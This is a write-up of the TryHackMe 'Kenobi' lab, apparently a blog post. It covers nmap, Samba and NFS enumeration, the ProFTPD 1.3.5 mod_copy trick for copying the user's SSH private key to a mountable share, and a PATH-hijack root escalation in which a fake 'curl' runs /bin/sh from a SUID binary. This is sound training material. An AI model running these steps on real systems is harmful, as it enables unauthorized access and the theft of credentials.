---
layout: post
title: Kenobi - Writeup
author: The-CyberCrusader
icon: https://i.postimg.cc/131xXYfr/logo-4-3.png
date: 2023-03-18
categories: [TryHackMe,Linux]
tags: [thm-kenobi]
pin: false
image:
  path: https://i.postimg.cc/131xXYfr/logo-4-3.png
  width: 1280   # in pixels
  height: 720   # in pixels
  alt: 
---

### Welcome Folks!!

This article outlines my approach to solving the “Kenobi” room available on the TryHackMe platform.

> Disclaimer 
No flags (user/root) are shown in this writeup, so follow the procedures to grab the flags! Enjoy! 
{: .prompt-danger}

[https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)

## Task 1 - Deploy the vulnerable machine

> **Deploy the machine attached to the task and press complete** <br>
  > **Make connection with VPN or use the attackbox on Tryhackme site to connect to the Tryhackme lab environment**.<br>
     *Ans:- No Answer Needed*

###### Reconnaissance

As usual I started by connecting to and scanning the target machine for any open ports and services using `NMAP`

```shell
sudo nmap -sC -sV {MACHINE_IP} -T4 -p- -oA nmap_result 
```
{: .nolineno }

```shell
-sV: Probe open ports to determine service/version info  .
-sC: Performs a script scan using default scripts available in NMAP.
-p-: Scan all ports
-oA: Outputs scan results to a file.
```
{: .nolineno }

```
# Nmap 7.93 scan initiated Sun Mar 19 06:43:50 2023 as: nmap -sC -sV -T4 -p- -oA nmap_result 10.10.222.95
Nmap scan report for 10.10.222.95
Host is up (0.21s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34044/udp   mountd
|   100005  1,2,3      36649/tcp   mountd
|   100005  1,2,3      46631/udp6  mountd
|   100005  1,2,3      54371/tcp6  mountd
|   100021  1,3,4      40852/udp   nlockmgr
|   100021  1,3,4      41351/tcp   nlockmgr
|   100021  1,3,4      45181/tcp6  nlockmgr
|   100021  1,3,4      49220/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
36649/tcp open  mountd      1-3 (RPC #100005)
41351/tcp open  nlockmgr    1-4 (RPC #100021)
44665/tcp open  mountd      1-3 (RPC #100005)
48483/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-03-19T05:48:47-05:00
| smb2-time: 
|   date: 2023-03-19T10:48:47
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 19 06:48:52 2023 -- 1 IP address (1 host up) scanned in 302.34 seconds
```
{: file="NMAP" }

As you can see from the above nmap_result, we have total 7 Ports open along with the services running.

- `port 21 (ftp)`

- `port 22 (SSH)`

- `port 80 (Apache)`

- `port 111 (RPC bind)`

- `port 139 (Samba)`

- `port 445 (Samba)`

- `port 2049 (nfs_acl)`


You may wonder that we have also obtained other ports like 36649,41351,44665,48483 but the services running in each of these ports is same i.e RPC hence we shall consider it as one port only.

> **Scan the machine with nmap, how many ports are open?** <br>
  > Ans:- *7*

Then I decided to visit the web page hosted on port 80 but nothing found except this image

![img](https://i.postimg.cc/kgMRqgRw/screenshot-154.jpg){: width="1280" height="720" .shadow}


## Task 2 - Enumerating Samba for shares 

###### Enumeration

Then I decided to use GoBuster, a tool which can be used to find hidden directories but nothing found.

```shell
gobuster dir -u http://[MACHINE_IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![img](https://i.postimg.cc/gk2pbj7q/screenshot-157.jpg){: width="1280" height="720" .shadow}


Now from the nmap result we know we have samba running on port 139 , 445  so I started enumerating these ports.

There are a number of ways to start enumerating SMB, common tools are `nmap`, `enum4linux`, and `smbclient`


```
# Nmap 7.93 scan initiated Sun Mar 19 08:01:15 2023 as: nmap -p 139,445 --script=smb-enum* -T4 -oN smb_enum 10.10.222.95
Nmap scan report for 10.10.222.95
Host is up (0.20s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.222.95\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 4
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.222.95\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.222.95\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-domains: 
|   KENOBI
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled

# Nmap done at Sun Mar 19 08:06:17 2023 -- 1 IP address (1 host up) scanned in 301.83 seconds

```
{: file='NMAP - smb-enum'}

From the above nmap result, we found the following shares: IPC$, anonymous, and print$. The dollar sign ($) means that a specific share is administrative, requiring admin access, and therefore we probably won’t be able to access that share without the privilege to do so.

NMAP doesn't show show whether we have the write access or not so I decided to also run `enum4linux` to enumerate samba service and the result is shown below

```shell
enum4linux -1 {MACHINE_IP}
```

Within few minutes it showed all the shares where anonymous share had the *READ ACCESS* I went to access the anonymous share using command 

```shell
smbclient //{MACHINE_IP}/anonymous
``` 

![img](https://i.postimg.cc/nzqmx0C5/screenshot-157.jpg){: width="1280" height="720" .shadow}

Even though `enum4linux` was half-way away from completeing the scan as soon as i saw the anonymous share has *READ ACCESS* I just used smbclient to access the anonymous share

As we can see we found the `log.txt` file.

![img](https://i.postimg.cc/43spn4PN/screenshot-157.jpg){: width="1280" height="720" .shadow}

Now here either you can directly read the file content using `more` command or `get` the file into your machine & then read it as i have shown in the above image.

![img](https://i.postimg.cc/XJ6zwYSG/screenshot-157.jpg){: width="1280" height="720" .shadow}

As we open the `log.txt` we can see `id_rsa` file has been saved under kenobi's home directory which we can use later to `ssh`.

Our earlier nmap port scan showed us port 111 running the service rpcbind. Which is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system(`nfs`). Lets use nmap to enumerate this.

```shell
nmap -p 111 –script=nfs-ls,nfs-statfs,nfs-showmount {MACHINE_IP}
```

![img](https://i.postimg.cc/T2sWQ73x/screenshot-157.jpg){: width="1280" height="720" .shadow}

Now we know that `/var` share is mountable. So lets go and mount this share.

> **Using the nmap command above, how many shares have been found?**<br>
  > *Ans:- 3*

> **Once you're connected, list the files on the share. What is the file can you see?** <br>
  > *Ans:- log.txt*

> **What port is FTP running on?**<br>
  > *Ans:- 21*  

> **What mount can we see??**<br>
  > *Ans:- /var*  


## Task 3 – Gain Initial Access With ProFTP

In this section we are going to try to get the initial access to the server. We need to get our hands on the `id_rsa` file. 

From our earlier nmap scan results we could see that the ftp version is `ProFTPD 1.3.5`.

Now we just need to see whether we have any known vulnerabilities regarding `ProFTPD 1.3.5` that could be exploited using `searchsploit` command.

```shell
searchsploit ProFTPD 1.3.5
```
{: .nolineno}

![img](https://i.postimg.cc/xTvwfZ7y/screenshot-157.jpg){: width="1280" height="720" .shadow}

It gives us readable table with exploit titles and paths to exploits that actually can be used against the target. Here we could see we have a Remote Command Execution vulnerability which can be used with metasploit *(I have tried it but as expected it didn't worked)* so we are left with `File Copy` exploit as we discussed earlier we want the `id_rsa` file. 


You can get any of the files available in Path column by using `-m` flag

```shell
searchsploit -m 36742.txt "PATH_TO_COPY"
```
{: .nolineno}




![img](https://i.postimg.cc/SxNg0QM8/screenshot-157.jpg){: width="1280" height="720" .shadow}

Reading the exploit by using `cat` we can see  `CPFR` which means Copy From, and `CPTO` means Copy To. That lets us basically copy and paste files and directories within the server, So we can use these commands to copy the `id_rsa` file from its location to a place from where we can acquire it i.e `/var/tmp` (from nmap scan).

![img](https://i.postimg.cc/7YqF6kzP/screenshot-157.jpg){: width="1280" height="720" .shadow}

Remember the scan we performed with nmap and NFS scripts `nfs-showmount` ? It discovered one directory in the server which we have access to `/var`. For the sake of easiness i have done it again using showmount

```shell
showmount - e [MACHINE_IP]
```
{: .nolineno}

![img](https://i.postimg.cc/0j1bmQsB/screenshot-157.jpg){: width="1280" height="720" .shadow}


Okay, so at this point all we have to do is copy the ssh private key from `/home/kenobi/.ssh/id_rsa` to `/var/tmp` so that we could get it to our attacking machine and use it to log into the server as `kenobi` user. Let’s do it!

First, we connect to the server to use ProFTPD module commands to copy the keypair to /var/tmp directory. You might be thinking why `/var/tmp` ? Because you might not have permission to write in `/var` directory. Directories like `/tmp` or `/var/tmp` are usually the safest when it comes to accessing their content as the attacker. Usually their permissions are not restricted as much as other directories.

So lets do `netcat` and copy the file.

![img](https://i.postimg.cc/FHdTprkx/screenshot-157.jpg){: width="1280" height="720" .shadow}


Now that we have successfully transferred the id_rsa into the var directory, we can mount the /var directory so that we can access the id_rsa files on our local machine.

Before that we need to create a directory by any name here i haved named `/nfs` inside our /tmp directory. 

Next, we used the `mount` command to `mount` the remote `/var` directory to our local `/nfs` folder. Moving to the `/nfs` directory we found the `id_rsa` file. Changing the permissions of the `id_rsa` file to make it ready to connect via SSH.

![img](https://i.postimg.cc/8kZwVJhH/screenshot-157.jpg){: width="1280" height="720" .shadow}

![img](https://i.postimg.cc/3N93tj6z/screenshot-157.jpg){: width="1280" height="720" .shadow}

![img](https://i.postimg.cc/rmNTpC8z/screenshot-157.jpg){: width="1280" height="720" .shadow}

Now lets log in via `SSH` as kenobi user using the `id_rsa` file & get the user flag located in `/home/kenobi/user.txt` using `cat user.txt`.

![img](https://i.postimg.cc/Fzk2Lyvj/screenshot-157.jpg){: width="1280" height="720" .shadow}

We are in! We basically became kenobi user in the server :)

> **What is the version?**<br>
  *Ans : 1.3.5*

> **How many exploits are there for the ProFTPd running?**<br>
  *Ans : 4*

> **We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user**.<br>
  Ans : *No Answer Needed*

>**We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.**<br>
  *Ans : No Answer Needed*

> **What is Kenobi's user flag (/home/kenobi/user.txt)?**<br>
  *Ans : d0b0xxxxxxxxxxxxxxxxxxx9*

## Task 4 - Privilege Escalation with Path Variable Manipulation

Now we have the `user` level privileges. Let’s move on to enumerating the permissions to figure out a way to elevate privileges & become `root` level user.

Tryhackme tells us to use Path Variable Manipulation in this task.

`SUID` bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the `SUID` bit can lead to all sorts of issues.

To search the system for these type of files run the following command

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```

```shell
  -type = f : means search for file
  -perm = -04000 : It means find file with SUID bit permission 
  -ls : List Files
  2>/dev/null : Output the standard errors to /dev/null  
```
{: .nolineno}

From the result we found  `/usr/bin/menu`  is not usually found in Linux.

![img](https://i.postimg.cc/jSZ0BQsh/screenshot-157.jpg){: width="1280" height="720" .shadow}

So let's try to execute it & see what this binary does.

It literally is some kind of menu and you can select an option from 1 to 3. I selected number 1 and we got some response as if it was HTTP response. I checked other two options as well just to make sure I won’t miss anything. The 2nd and the 3rd option display some data regarding titles assigned to those numbers.

THM suggests to use `strings` command to see if there are any “human readable strings” in this binary and found that it uses the `curl` command to get the localhost. As it doesn’t mention the full path of `curl`, we can create a malicious payload with the name `curl` and add it into the path. This will make the binary run our malicious file instead of the original `curl`.

cd inside `/tmp` folder or you can do it anywhere you want

Here’s what we’re gonna do.

- We will create a file called `curl` and put `/bin/sh` in it just like that,

- Give all the permissions to the curl file that we just created by `chmod 777` curl

- Add the directory with our `curl` script to the `PATH` so that system would look for it when calling `curl` . Attention! The order is respected here so we will need to add path to our directory at the beginning. Otherwise, when calling curl the system might find a proper version of curl on the way before even checking if there’s any binary like that in our directory

- Call the script and see the magic!

```shell
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
{: .nolineno}

Thats it! We got the `Root` shell.

Now lets get the root flag located in `/root/root.txt` using `cat /root/root.txt` 

![img](https://i.postimg.cc/ydFJHYLB/screenshot-157.jpg){: width="1280" height="720" .shadow}

> **What file looks particularly out of the ordinary?**<br>
  Ans : /usr/bin/menu

> **Run the binary, how many options appear?**<br>
  Ans : 3

> **We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!**<br>
  Ans : No Answer Needed

> **What is the root flag (/root/root.txt)?**<br>
  Ans : 177bxxxxxxxxxxxxxxxx02

Thats it for now. Will catch you you up in the next blog. Until then keep H A C K I N G. 

![img](https://i.postimg.cc/wBRLkL5t/output-onlineunicodetools-2.png){: width="1280" height="720" .shadow}